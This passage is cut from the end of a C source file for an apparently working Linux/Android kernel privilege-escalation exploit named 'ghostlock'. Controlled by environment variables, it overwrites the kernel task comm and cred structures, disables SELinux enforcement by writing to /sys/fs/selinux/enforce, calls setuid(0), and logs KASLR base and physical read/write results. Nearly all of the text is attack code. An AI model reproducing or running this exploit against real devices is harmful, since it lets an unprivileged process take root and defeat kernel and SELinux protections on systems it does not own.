      _exit(bits);
    }
    if (tl && getenv("GHOSTLOCK_TASK_WRITE")) {
      char nb[64];
      setenv("GHOSTLOCK_SKIP_PAGE", "1", 1);
      snprintf(nb, sizeof nb, "0x%zx", (size_t)(tl + TASK_COMM_OFF));
      setenv("GHOSTLOCK_ZWRITE2", nb, 1);
      setenv("GHOSTLOCK_ZWRITE_SLOT", "0", 1);
      run_main_route_threads();
      char comm[64];
      memset(comm, 0, sizeof comm);
      int cfd = open("/proc/self/comm", O_RDONLY);
      int cn = cfd >= 0 ? (int)read(cfd, comm, sizeof(comm) - 1) : -1;
      if (cfd >= 0) close(cfd);
      pr_info("task write: comm='%s' n=%d\n", comm, cn);
      if (cn >= 0 && (cn == 0 || comm[0] == '\n')) {
        unsetenv("GHOSTLOCK_ZWRITE2");
        snprintf(nb, sizeof nb, "0x%zx", (size_t)tl);
        setenv("GHOSTLOCK_CREDWRITE", nb, 1);
        setenv("GHOSTLOCK_ZWRITE_SLOT", "1", 1);
        run_main_route_threads();
        pr_success("cred write: uid=%d euid=%d gid=%d\n",
                   (int)getuid(), (int)geteuid(), (int)getgid());
      }
    }
    return 0;
  }

  pin_to_core(CORE);
  /* GHOSTLOCK_SKIP_PAGE=1: the zero-write route (GHOSTLOCK_ZWRITE2) does not
   * need a controlled payload page at all - the fake lock lives in
   * empty_zero_page.  Skipping the whole heap/page preparation turns a run
   * from ~5 min into ~30 s and keeps the heap untouched. */
  if (getenv("GHOSTLOCK_SKIP_PAGE")) {
    page_base = 0;
    pr_info("page prepare: skipped (GHOSTLOCK_SKIP_PAGE)\n");
  } else {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  }

  /* bisect switch: hold here (no further kernel work) and see whether the
   * ghostlock page preparation alone kills the kernel later on. */
  if (getenv("GHOSTLOCK_AFTER_PAGE_SLEEP")) {
    int secs = atoi(getenv("GHOSTLOCK_AFTER_PAGE_SLEEP"));
    if (secs < 1) {
      secs = 30;
    }
    pr_info("after-page hold: page_base=%016zx sleeping %ds\n", page_base, secs);
    sleep((unsigned)secs);
    pr_success("after-page hold survived %ds\n", secs);
    return 0;
  }

  run_main_route_threads();

  /* GHOSTLOCK_ESCALATE=1: after a successful zero-write route, verify that the
   * capability hook list is really empty by exercising CAP_DAC_OVERRIDE /
   * CAP_SETUID from this (uid 2000) process. */
  if (getenv("GHOSTLOCK_ESCALATE")) {
    const char *enf = "/sys/fs/selinux/enforce";
    int fd = open(enf, O_WRONLY);
    int oerr = errno;
    ssize_t wr = fd >= 0 ? write(fd, "0", 1) : -1;
    int werr = errno;
    if (fd >= 0) close(fd);
    errno = 0;
    int rg = setgid(0), eg = errno;
    errno = 0;
    int ru = setuid(0), eu = errno;
    pr_info("escalate: enforce open=%d/%d write=%zd/%d setgid=%d/%d setuid=%d/%d "
            "uid=%d euid=%d gid=%d\n",
            fd, oerr, wr, werr, rg, eg, ru, eu,
            (int)getuid(), (int)geteuid(), (int)getgid());
    if (ru == 0) {
      pr_success("escalate: now uid=0, dumping a root-only file\n");
    }
  }

  if (getenv("GHOSTLOCK_SKIP_PAGE")) {
    pr_success("zero-write route finished (page preparation skipped)\n");
    return 0;
  }

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u sid=%u/%u->%u/%u "
             "selinux=%u->%u setgid=%d setuid=%d setenforce=%d/%d\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
             cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
             setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }
  sleep(5);
  return 0;
}
